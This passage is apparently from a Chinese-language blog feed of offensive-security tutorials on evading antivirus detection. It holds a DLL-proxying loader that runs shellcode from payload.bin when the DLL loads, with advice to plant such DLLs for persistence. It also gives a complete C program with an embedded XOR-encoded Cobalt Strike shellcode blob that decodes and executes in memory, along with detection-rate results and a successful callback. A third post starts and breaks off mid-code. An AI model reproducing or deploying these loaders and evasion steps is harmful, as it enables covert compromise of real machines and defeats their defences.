class="hljs-meta-string">&quot;/export:nettle_yarrow256_needed_sources=tmp2BF5.nettle_yarrow256_needed_sources,@480&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_yarrow256_random=tmp2BF5.nettle_yarrow256_random,@481&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_yarrow256_seed=tmp2BF5.nettle_yarrow256_seed,@482&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_yarrow256_slow_reseed=tmp2BF5.nettle_yarrow256_slow_reseed,@483&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_yarrow256_update=tmp2BF5.nettle_yarrow256_update,@484&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_yarrow_key_event_estimate=tmp2BF5.nettle_yarrow_key_event_estimate,@485&quot;</span>)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker, <span class="hljs-meta-string">&quot;/export:nettle_yarrow_key_event_init=tmp2BF5.nettle_yarrow_key_event_init,@486&quot;</span>)</span><br><br><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">DoMagic</span><span class="hljs-params">(LPVOID lpParameter)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//https://stackoverflow.com/questions/14002954/c-programming-how-to-read-the-whole-file-contents-into-a-buffer</span><br>    FILE* fp;<br>    <span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>* <span class="hljs-built_in">buffer</span>;<br><br>    fp = fopen(<span class="hljs-string">&quot;payload.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    fseek(fp, <span class="hljs-number">0</span>, SEEK_END);<br>    <span class="hljs-built_in">size</span> = ftell(fp);<br>    fseek(fp, <span class="hljs-number">0</span>, SEEK_SET);<br>    <span class="hljs-built_in">buffer</span> = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">size</span>);<br>    <br>    <span class="hljs-comment">//https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources</span><br>    fread(<span class="hljs-built_in">buffer</span>, <span class="hljs-built_in">size</span>, <span class="hljs-number">1</span>, fp);<br>    <br>    <span class="hljs-keyword">void</span>* exec = VirtualAlloc(<span class="hljs-number">0</span>, <span class="hljs-built_in">size</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>    <br>    <span class="hljs-built_in">memcpy</span>(exec, <span class="hljs-built_in">buffer</span>, <span class="hljs-built_in">size</span>);<br>    <br>    ((<span class="hljs-keyword">void</span>(*) ())exec)();<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule,</span></span><br><span class="hljs-function"><span class="hljs-params">    DWORD ul_reason_for_call,</span></span><br><span class="hljs-function"><span class="hljs-params">    LPVOID lpReserved</span></span><br><span class="hljs-function"><span class="hljs-params">)</span></span><br><span class="hljs-function"></span>&#123;<br>    HANDLE threadHandle;<br><br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        <span class="hljs-comment">// https://gist.github.com/securitytube/c956348435cc90b8e1f7</span><br>                <span class="hljs-comment">// Create a thread and close the handle as we do not want to use it to wait for it </span><br>        threadHandle = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, DoMagic, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>        CloseHandle(threadHandle);<br>    <br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>Domagic函数从payload.bin中读取shellcode，之后使用virtualmalloc和malloc函数分配相应大小的内存空间，再将指针指向对应的空间执行shellcode</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function">DWORD WINAPI <span class="hljs-title">DoMagic</span><span class="hljs-params">(LPVOID lpParameter)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//https://stackoverflow.com/questions/14002954/c-programming-how-to-read-the-whole-file-contents-into-a-buffer</span><br>    FILE* fp;<br>    <span class="hljs-keyword">size_t</span> <span class="hljs-built_in">size</span>;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>* <span class="hljs-built_in">buffer</span>;<br><br>    fp = fopen(<span class="hljs-string">&quot;payload.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    fseek(fp, <span class="hljs-number">0</span>, SEEK_END);<br>    <span class="hljs-built_in">size</span> = ftell(fp);<br>    fseek(fp, <span class="hljs-number">0</span>, SEEK_SET);<br>    <span class="hljs-built_in">buffer</span> = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">size</span>);<br>    <br>    <span class="hljs-comment">//https://ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources</span><br>    fread(<span class="hljs-built_in">buffer</span>, <span class="hljs-built_in">size</span>, <span class="hljs-number">1</span>, fp);<br>    <br>    <span class="hljs-keyword">void</span>* exec = VirtualAlloc(<span class="hljs-number">0</span>, <span class="hljs-built_in">size</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br>    <br>    <span class="hljs-built_in">memcpy</span>(exec, <span class="hljs-built_in">buffer</span>, <span class="hljs-built_in">size</span>);<br>    <br>    ((<span class="hljs-keyword">void</span>(*) ())exec)();<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>Dllmain函数为dll函数的入口</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-built_in">BOOL</span> APIENTRY DllMain(HMODULE hModule,<br>    DWORD ul_reason_for_call,<br>    LPVOID lpReserved<br>)<br>&#123;<br>    HANDLE threadHandle;<br><br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        <span class="hljs-comment">// https://gist.github.com/securitytube/c956348435cc90b8e1f7</span><br>                <span class="hljs-comment">// Create a thread and close the handle as we do not want to use it to wait for it </span><br>        threadHandle = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, DoMagic, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>        CloseHandle(threadHandle);<br>    <br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>原文章的原理如下图    </p><p>A：fzsftp.exe </p><p>B:tmp2BF5.dll(正常的libnettle-8.dll文件) </p><p>C:恶意libnettle-8.dll </p><p>E:payload.bin 存储shellcode</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/7bf01099-c86a-478d-977c-32479a0758df.png" alt="imgbed.cn图床"></a></p><p>实际操作中用cs直接生成的shellcode已经被杀软识别，因此免杀效果很差，将shellcode分离后远程加载并进行加密后才可以实现免杀。在实战中可以根据目标机器上安装的软件生成dll文件并替换，实现权限维持</p><p>参考</p><blockquote><p><a href="https://cloud.tencent.com/developer/article/1739263">https://cloud.tencent.com/developer/article/1739263</a></p><p><a href="https://github.com/Flangvik/SharpDllProxy">https://github.com/Flangvik/SharpDllProxy</a></p><p><a href="https://gist.github.com/securitytube/c956348435cc90b8e1f7">https://gist.github.com/securitytube/c956348435cc90b8e1f7</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>C编译xor加密shellcode免杀</title>
    <link href="/2020/12/06/C-xor%E5%8A%A0%E5%AF%86%E5%85%8D%E6%9D%80/"/>
    <url>/2020/12/06/C-xor%E5%8A%A0%E5%AF%86%E5%85%8D%E6%9D%80/</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h2><p>cs生成c格式shellcode</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/1b827e97-670d-4cc1-a065-94ae3a37ff28.png" alt="imgbed.cn图床"></a></p><h3 id="用010editor加密shellcode"><a href="#用010editor加密shellcode" class="headerlink" title="用010editor加密shellcode"></a>用010editor加密shellcode</h3><p>Ctrl+Shift+V将shellcode复制到010editor中，选择Tools-&gt;Hex Operation-&gt;Binary Xor，设置运算数为0x97,将shellcode与0x97异或后生成新的shellcode</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/20a8b51b-68ea-41f9-bf16-7b29d1c5ec2c.png" alt="imgbed.cn图床"></a></p><p>将shellcode与0x97异或后生成新的shellcode</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/7022a482-b0fc-4cdd-afd3-f6a216810f02.png" alt="imgbed.cn图床"></a></p><p>Ctrl+Shift+c复制shellcode到Sublime text中，Ctrl+a选中全部将shellcode修改成c语言中的十六进制格式</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/ae866e91-0273-4a5e-a9c4-dd658bd32955.png" alt="imgbed.cn图床"></a></p><h3 id="Visual-Studio编译生成exe文件"><a href="#Visual-Studio编译生成exe文件" class="headerlink" title="Visual Studio编译生成exe文件"></a>Visual Studio编译生成exe文件</h3><p>将xor加密后的shellcode与0x97异或还原后执行</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/f159cb36-9790-41c4-bbed-bfc7ba09150a.png" alt="imgbed.cn图床"></a></p><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span><span class="hljs-params">(_stdcall *CODE)</span><span class="hljs-params">()</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker,<span class="hljs-meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> shellcode[] =<br><span class="hljs-string">&quot;\x6B\xDF\x14\x73\x67\x7F\x5F\x97\x97\x97\xD6\xC6\xD6\xC7\xC5\xC6&quot;</span><br><span class="hljs-string">&quot;\xC1\xDF\xA6\x45\xF2\xDF\x1C\xC5\xF7\xDF\x1C\xC5\x8F\xDF\x1C\xC5&quot;</span><br><span class="hljs-string">&quot;\xB7\xDF\x1C\xE5\xC7\xDF\x98\x20\xDD\xDD\xDA\xA6\x5E\xDF\xA6\x57&quot;</span><br><span class="hljs-string">&quot;\x3B\xAB\xF6\xEB\x95\xBB\xB7\xD6\x56\x5E\x9A\xD6\x96\x56\x75\x7A&quot;</span><br><span class="hljs-string">&quot;\xC5\xD6\xC6\xDF\x1C\xC5\xB7\x1C\xD5\xAB\xDF\x96\x47\xF1\x16\xEF&quot;</span><br><span class="hljs-string">&quot;\x8F\x9C\x95\xE2\xE5\x1C\x17\x1F\x97\x97\x97\xDF\x12\x57\xE3\xF0&quot;</span><br><span class="hljs-string">&quot;\xDF\x96\x47\xC7\x1C\xDF\x8F\xD3\x1C\xD7\xB7\xDE\x96\x47\x74\xC1&quot;</span><br><span class="hljs-string">&quot;\xDF\x68\x5E\xD6\x1C\xA3\x1F\xDF\x96\x41\xDA\xA6\x5E\xDF\xA6\x57&quot;</span><br><span class="hljs-string">&quot;\x3B\xD6\x56\x5E\x9A\xD6\x96\x56\xAF\x77\xE2\x66\xDB\x94\xDB\xB3&quot;</span><br><span class="hljs-string">&quot;\x9F\xD2\xAE\x46\xE2\x4F\xCF\xD3\x1C\xD7\xB3\xDE\x96\x47\xF1\xD6&quot;</span><br><span class="hljs-string">&quot;\x1C\x9B\xDF\xD3\x1C\xD7\x8B\xDE\x96\x47\xD6\x1C\x93\x1F\xDF\x96&quot;</span><br><span class="hljs-string">&quot;\x47\xD6\xCF\xD6\xCF\xC9\xCE\xCD\xD6\xCF\xD6\xCE\xD6\xCD\xDF\x14&quot;</span><br><span class="hljs-string">&quot;\x7B\xB7\xD6\xC5\x68\x77\xCF\xD6\xCE\xCD\xDF\x1C\x85\x7E\xD8\x68&quot;</span><br><span class="hljs-string">&quot;\x68\x68\xCA\xFD\x97\xDE\x29\xE0\xFE\xF9\xFE\xF9\xF2\xE3\x97\xD6&quot;</span><br><span class="hljs-string">&quot;\xC1\xDE\x1E\x71\xDB\x1E\x66\xD6\x2D\xDB\xE0\xB1\x90\x68\x42\xDF&quot;</span><br><span class="hljs-string">&quot;\xA6\x5E\xDF\xA6\x45\xDA\xA6\x57\xDA\xA6\x5E\xD6\xC7\xD6\xC7\xD6&quot;</span><br><span class="hljs-string">&quot;\x2D\xAD\xC1\xEE\x30\x68\x42\x7C\xE4\xCD\xDF\x1E\x56\xD6\x2F\xC7&quot;</span><br><span class="hljs-string">&quot;\x97\x97\x97\xDA\xA6\x5E\xD6\xC6\xD6\xC6\xFD\x94\xD6\xC6\xD6\x2D&quot;</span><br><span class="hljs-string">&quot;\xC0\x1E\x08\x51\x68\x42\x7C\xCE\xCC\xDF\x1E\x56\xDF\xA6\x45\xDE&quot;</span><br><span class="hljs-string">&quot;\x1E\x4F\xDA\xA6\x5E\xC5\xFF\x97\x95\xD7\x13\xC5\xC5\xD6\x2D\x7C&quot;</span><br><span class="hljs-string">&quot;\xC2\xB9\xAC\x68\x42\xDF\x1E\x51\xDF\x14\x54\xC7\xFD\x9D\xC8\xDF&quot;</span><br><span class="hljs-string">&quot;\x1E\x66\xDF\x1E\x4D\xDE\x50\x57\x68\x68\x68\x68\xDA\xA6\x5E\xC5&quot;</span><br><span class="hljs-string">&quot;\xC5\xD6\x2D\xBA\x91\x8F\xEC\x68\x42\x12\x57\x98\x12\x0A\x96\x97&quot;</span><br><span class="hljs-string">&quot;\x97\xDF\x68\x58\x98\x13\x1B\x96\x97\x97\x7C\x44\x7E\x73\x96\x97&quot;</span><br><span class="hljs-string">&quot;\x97\x7F\x35\x68\x68\x68\xB8\xED\xDE\xD1\xC3\x97\x78\x6F\xCF\x9C&quot;</span><br><span class="hljs-string">&quot;\xEF\x6F\x7B\x00\x38\x66\xFD\xA8\xFF\x7B\xCF\xF8\x9A\x4B\xA7\x08&quot;</span><br><span class="hljs-string">&quot;\x95\x69\x8B\x57\xDF\x10\xFE\x9E\xB6\x17\x81\xB4\xC6\x50\x5A\xE7&quot;</span><br><span class="hljs-string">&quot;\xFD\x31\x7C\xF6\x3A\xD4\xCA\x4D\xA2\x00\x6B\xBF\x1D\xB4\x62\x1B&quot;</span><br><span class="hljs-string">&quot;\xC6\xA3\x87\x19\xEE\x2E\xBA\x2A\x4B\xD8\x89\x65\xB2\xF3\xB0\xC8&quot;</span><br><span class="hljs-string">&quot;\xF3\x1B\x92\x1A\xFF\x97\xC2\xE4\xF2\xE5\xBA\xD6\xF0\xF2\xF9\xE3&quot;</span><br><span class="hljs-string">&quot;\xAD\xB7\xDA\xF8\xED\xFE\xFB\xFB\xF6\xB8\xA2\xB9\xA7\xB7\xBF\xF4&quot;</span><br><span class="hljs-string">&quot;\xF8\xFA\xE7\xF6\xE3\xFE\xF5\xFB\xF2\xAC\xB7\xDA\xC4\xDE\xD2\xB7&quot;</span><br><span class="hljs-string">&quot;\xA6\xA7\xB9\xA7\xAC\xB7\xC0\xFE\xF9\xF3\xF8\xE0\xE4\xB7\xD9\xC3&quot;</span><br><span class="hljs-string">&quot;\xB7\xA1\xB9\xA5\xAC\xB7\xC0\xFE\xF9\xA1\xA3\xAC\xB7\xEF\xA1\xA3&quot;</span><br><span class="hljs-string">&quot;\xAC\xB7\xC3\xE5\xFE\xF3\xF2\xF9\xE3\xB8\xA1\xB9\xA7\xBE\x9A\x9D&quot;</span><br><span class="hljs-string">&quot;\x97\x64\xF1\xB2\xFD\x10\x92\x3B\x83\x57\x64\x8C\xAA\x47\xD8\x6B&quot;</span><br><span class="hljs-string">&quot;\xB3\xE3\xBE\xF9\x75\x1C\xA5\xD6\x70\x91\xE2\xF2\x6A\xA1\xB6\xF0&quot;</span><br><span class="hljs-string">&quot;\x32\x70\x6D\x9F\xE9\xD6\x2F\xA9\x34\x2F\x15\x73\xD8\x66\x8F\x20&quot;</span><br><span class="hljs-string">&quot;\x1D\x9A\xCA\xBF\x50\x3C\x69\x66\xA7\x99\xB9\x80\xF3\xEF\x82\x8E&quot;</span><br><span class="hljs-string">&quot;\xC2\xC5\x9A\x01\xD2\xDC\x79\x99\xEE\x32\x4C\x6C\xB0\x2E\x1E\xF0&quot;</span><br><span class="hljs-string">&quot;\xCD\x26\x7C\xE3\x1D\x78\x82\xF1\xFD\x88\xB7\x23\x9D\xCC\x7A\x5A&quot;</span><br><span class="hljs-string">&quot;\xE5\x46\xF0\xD7\xCA\xCC\x3E\xAB\xF5\x09\xBB\x3C\x52\x1E\xAB\x1A&quot;</span><br><span class="hljs-string">&quot;\x3A\x2F\xF7\x1E\xF7\xCF\xA6\x2B\x93\xBF\xAB\xFB\xF7\x44\x2E\xD8&quot;</span><br><span class="hljs-string">&quot;\x69\x64\x26\xD9\xB6\xB2\xB9\xDF\xF6\x27\x52\x8A\x1A\x26\x81\x14&quot;</span><br><span class="hljs-string">&quot;\xFD\xD6\x88\xD6\x23\x1F\x6E\xFC\x09\x30\x57\xEC\x80\xE1\x14\xF9&quot;</span><br><span class="hljs-string">&quot;\x62\x5A\x84\xA4\x85\xA1\xC8\xE2\x43\xFC\x6E\x18\x95\x90\x7E\x31&quot;</span><br><span class="hljs-string">&quot;\x03\x78\x32\x18\x9A\x89\xDA\xAF\x84\x5B\x95\x21\x78\xF4\xA3\x7F&quot;</span><br><span class="hljs-string">&quot;\x82\x36\x32\xE0\x44\x13\x1A\x39\xE2\x47\xE7\xED\xA3\x93\x80\x53&quot;</span><br><span class="hljs-string">&quot;\x05\xCC\x5A\xBD\x3E\x97\xD6\x29\x67\x22\x35\xC1\x68\x42\xDF\xA6&quot;</span><br><span class="hljs-string">&quot;\x5E\x2D\x97\x97\xD7\x97\xD6\x2F\x97\x87\x97\x97\xD6\x2E\xD7\x97&quot;</span><br><span class="hljs-string">&quot;\x97\x97\xD6\x2D\xCF\x33\xC4\x72\x68\x42\xDF\x04\xC4\xC4\xDF\x1E&quot;</span><br><span class="hljs-string">&quot;\x70\xDF\x1E\x66\xDF\x1E\x4D\xD6\x2F\x97\xB7\x97\x97\xDE\x1E\x6E&quot;</span><br><span class="hljs-string">&quot;\xD6\x2D\x85\x01\x1E\x75\x68\x42\xDF\x14\x53\xB7\x12\x57\xE3\x21&quot;</span><br><span class="hljs-string">&quot;\xF1\x1C\x90\xDF\x96\x54\x12\x57\xE2\x40\xCF\xCF\xCF\xDF\x92\x97&quot;</span><br><span class="hljs-string">&quot;\x97\x97\x97\xC7\x54\x7F\x08\x6A\x68\x68\xA6\xAE\xA5\xB9\xA6\xA1&quot;</span><br><span class="hljs-string">&quot;\xAF\xB9\xA5\xA7\xA3\xB9\xA6\xA3\xA4\x97\x85\xA3\xC1\xEF&quot;</span>;<br><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> xorshellcode[<span class="hljs-keyword">sizeof</span>(shellcode)];<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-keyword">sizeof</span>(shellcode) - <span class="hljs-number">1</span>; i++)<br>&#123;<br>xorshellcode[i] = shellcode[i]^<span class="hljs-number">0x97</span>;<br>&#125;<br><br>PVOID p = <span class="hljs-literal">NULL</span>;<br>p = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(xorshellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br><span class="hljs-keyword">if</span> (p == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-built_in">memcpy</span>(p, xorshellcode, <span class="hljs-keyword">sizeof</span>(xorshellcode));<br><br>CODE code = (CODE)p;<br>code();<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="免杀效果测试"><a href="#免杀效果测试" class="headerlink" title="免杀效果测试"></a>免杀效果测试</h3><p>VirusTotal查杀率15/69</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/a804f20c-8eb6-4db4-aa98-324b5a9c4986.png" alt="imgbed.cn图床"></a></p><p>火绒不杀，卡巴斯基拦截</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/45697d62-b406-4d79-83a6-462a04dc8852.PNG" alt="imgbed.cn图床"></a></p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/9e78c239-76a2-49d2-805f-b46a693dfbcb.PNG" alt="imgbed.cn图床"></a></p><p>cs上线</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/0b236383-c34f-4c7a-9109-0296c508e850.png" alt="imgbed.cn图床"></a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h2><p><a href="https://www.freebuf.com/articles/system/228233.html">https://www.freebuf.com/articles/system/228233.html</a></p><p><a href="https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html">https://uknowsec.cn/posts/notes/shellcode%E5%8A%A0%E8%BD%BD%E6%80%BB%E7%BB%93.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>C编译shellcode+shielden加壳免杀火绒、卡巴斯基</title>
    <link href="/2020/11/25/C%E7%BC%96%E8%AF%91shellcode-shielden%E5%8A%A0%E5%A3%B3%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92%E3%80%81%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA/"/>
    <url>/2020/11/25/C%E7%BC%96%E8%AF%91shellcode-shielden%E5%8A%A0%E5%A3%B3%E5%85%8D%E6%9D%80%E7%81%AB%E7%BB%92%E3%80%81%E5%8D%A1%E5%B7%B4%E6%96%AF%E5%9F%BA/</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="CS-生成-shellcode"><a href="#CS-生成-shellcode" class="headerlink" title="CS 生成 shellcode"></a>CS 生成 shellcode</h2><p>在Payload Generator处选择veil，生成shellcode</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/9dff81e4-191f-4d44-8f08-a2fac8489af8.png" alt="imgbed.cn图床"></a></p><p>生成shellcode</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/1daf2a48-354c-40fb-bf53-f844e5b15f41.png" alt="imgbed.cn图床"></a></p><h2 id="使用Visual-Studio-2017编译shellcode"><a href="#使用Visual-Studio-2017编译shellcode" class="headerlink" title="使用Visual Studio 2017编译shellcode"></a>使用Visual Studio 2017编译shellcode</h2><p>复制shellcode到以下代码中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// MSF.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;Windows.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(linker,<span class="hljs-meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)                        <span class="hljs-comment">//去除窗口</span></span><br><span class="hljs-comment">//步骤b所在桌面产生的 shellcode.c的内容;</span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> shellcode[] = <span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span 